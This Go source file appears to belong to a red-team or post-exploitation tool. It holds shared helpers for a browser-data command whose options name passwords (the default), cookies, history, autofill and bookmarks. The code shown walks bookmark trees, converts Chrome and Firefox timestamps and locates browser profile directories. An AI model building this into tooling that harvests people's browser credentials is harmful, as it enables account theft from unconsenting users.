package commands

import (
	"os"
	"path/filepath"
	"strings"
	"time"
)

// Shared browser command types and helpers used by both Windows and non-Windows.

type browserArgs struct {
	Action  string `json:"action"`  // passwords (default), cookies, history, autofill, bookmarks
	Browser string `json:"browser"` // all (default), chrome, edge, chromium
}

type browserBookmarkEntry struct {
	Browser string
	Name    string
	URL     string
	Folder  string
}

type bookmarkNode struct {
	Type     string         `json:"type"`
	Name     string         `json:"name"`
	URL      string         `json:"url"`
	Children []bookmarkNode `json:"children"`
}

func extractBookmarks(node *bookmarkNode, browser, folder string, out *[]browserBookmarkEntry) {
	if node.Type == "url" && node.URL != "" {
		*out = append(*out, browserBookmarkEntry{
			Browser: browser,
			Name:    node.Name,
			URL:     node.URL,
			Folder:  folder,
		})
	}
	for i := range node.Children {
		childFolder := folder
		if node.Children[i].Type == "folder" {
			childFolder = folder + "/" + node.Children[i].Name
		}
		extractBookmarks(&node.Children[i], browser, childFolder, out)
	}
}

// chromeTimeToString converts a Chrome/Chromium timestamp to a human-readable UTC string.
// Chrome uses two epoch formats:
// - History/cookies: microseconds since 1601-01-01 (very large numbers, >10^16)
// - Autofill: seconds since Unix epoch (smaller numbers, ~10^9)
// This function auto-detects based on magnitude.
func chromeTimeToString(ts int64) string {
	if ts <= 0 {
		return "never"
	}
	const chromeToUnixMicros = 11644473600000000
	if ts > 1e13 {
		unixMicros := ts - chromeToUnixMicros
		if unixMicros < 0 {
			return "unknown"
		}
		t := time.Unix(unixMicros/1000000, (unixMicros%1000000)*1000)
		return t.UTC().Format("2006-01-02 15:04:05")
	}
	t := time.Unix(ts, 0)
	return t.UTC().Format("2006-01-02 15:04:05")
}

// firefoxTimeToString converts a Firefox PRTime timestamp (microseconds since Unix epoch)
// to a human-readable UTC string.
func firefoxTimeToString(ts int64) string {
	if ts <= 0 {
		return "never"
	}
	t := time.Unix(ts/1000000, (ts%1000000)*1000)
	return t.UTC().Format("2006-01-02 15:04:05")
}

// isFirefoxBrowser returns true if the browser name indicates Firefox.
func isFirefoxBrowser(name string) bool {
	return strings.EqualFold(name, "Firefox")
}

// findFirefoxProfiles discovers Firefox profile directories within the given base path.
// Firefox profiles use random prefixes (e.g., "a1b2c3d4.default-release").
func findFirefoxProfiles(baseDir string) []string {
	var profiles []string

	entries, err := os.ReadDir(baseDir)
	if err != nil {
		return nil
	}

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		name := entry.Name()
		// Firefox profile dirs contain ".default" or ".default-release" suffix
		if strings.Contains(name, ".default") {
			profiles = append(profiles, filepath.Join(baseDir, name))
		}
	}
	return profiles
}

// findProfilesWithFile returns Chromium profile directories containing the given file.
func findProfilesWithFile(userDataDir string, relPath string) []string {
	var profiles []string

	check := func(dir string) {
		if _, err := os.Stat(filepath.Join(dir, relPath)); err == nil {
			profiles = append(profiles, dir)
		}
	}

	check(filepath.Join(userDataDir, "Default"))

	entries, err := os.ReadDir(userDataDir)
	if err != nil {
		return profiles
	}
	for _, entry := range entries {
		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile ") {
			check(filepath.Join(userDataDir, entry.Name()))
		}
	}

	return profiles
}
